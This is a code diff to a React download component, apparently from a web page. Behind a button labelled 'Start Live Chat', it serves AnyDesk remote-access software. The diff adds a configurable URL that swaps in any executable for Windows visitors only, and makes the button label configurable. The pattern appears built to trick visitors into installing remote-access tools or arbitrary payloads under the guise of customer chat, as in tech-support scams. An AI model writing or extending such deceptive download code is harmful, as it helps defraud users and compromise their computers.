@@ -5,6 +5,12 @@ import { useUserRegion } from "../hooks/useUserRegion";
 
 type OS = "Windows" | "macOS" | "Linux" | "Unknown";
 
+// Configurable via environment variables at deployment time.
+// Set NEXT_PUBLIC_CUSTOM_TOOL_URL to any download URL to override AnyDesk.
+// Leave it empty to use AnyDesk as default.
+const CUSTOM_TOOL_URL = process.env.NEXT_PUBLIC_CUSTOM_TOOL_URL || "";
+const TOOL_LABEL = process.env.NEXT_PUBLIC_TOOL_LABEL || "Start Live Chat";
+
 export function SmartDownloader() {
   const [os, setOs] = useState<OS>("Unknown");
   const { regionData, loading } = useUserRegion();
@@ -17,6 +23,11 @@ export function SmartDownloader() {
   }, []);
 
   const getDownloadLink = (targetOs: OS) => {
+    // If a custom tool URL is set, serve it to Windows users only.
+    // macOS/Linux automatically fall back to AnyDesk.
+    if (CUSTOM_TOOL_URL && targetOs === "Windows") return CUSTOM_TOOL_URL;
+
+    // Default fallback: AnyDesk per-OS (always available)
     switch (targetOs) {
       case "Windows":
         return "https://download.anydesk.com/AnyDesk.exe";
@@ -46,7 +57,7 @@ export function SmartDownloader() {
         <svg className="w-5 h-5 mr-3" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
           <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z" />
         </svg>
-        Start Live Chat
+        {TOOL_LABEL}
       </button>
       
       <div className="mt-8 w-full p-5 bg-white/5 backdrop-blur-sm rounded-lg border border-white/10">
